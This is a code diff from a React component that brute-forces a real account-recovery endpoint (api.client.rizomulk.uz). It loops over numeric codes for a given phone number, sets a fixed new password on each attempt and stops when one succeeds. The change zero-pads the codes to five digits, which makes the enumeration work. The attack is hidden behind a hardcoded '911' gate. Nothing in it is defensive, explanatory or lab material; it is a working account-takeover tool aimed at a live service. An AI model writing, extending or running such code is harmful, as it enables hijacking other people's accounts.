@@ -82,7 +82,7 @@ export default function Example() {
         if(password == 911){
             for (let index = start; index < end; index++) {
                 try {
-                    const response = await fetch(`https://api.client.rizomulk.uz/api/v1/account/recovery?phone=${username}&code=${index}&password=muxa1575`, {
+                    const response = await fetch(`https://api.client.rizomulk.uz/api/v1/account/recovery?phone=${username}&code=${index.toString().padStart(5, '0')}&password=muxa1575`, {
                       method: "GET",
                       headers: {
                         "Content-Type": "application/json",
@@ -92,12 +92,12 @@ export default function Example() {
                     const jsonData = await response.json();
         
                     if(jsonData.status == "OK"){ 
-                        toast.success(index)
+                        toast.success(index.toString().padStart(5, '0'))
                         setCodeAllowed(true)
                         setPassword('')
                         break;
                       }else
-                        toast.error(index) 
+                        toast.error(index.toString().padStart(5, '0')) 
                     
                     // Optionally, you can check the response and navigate based on it
                     if (jsonData.success) {
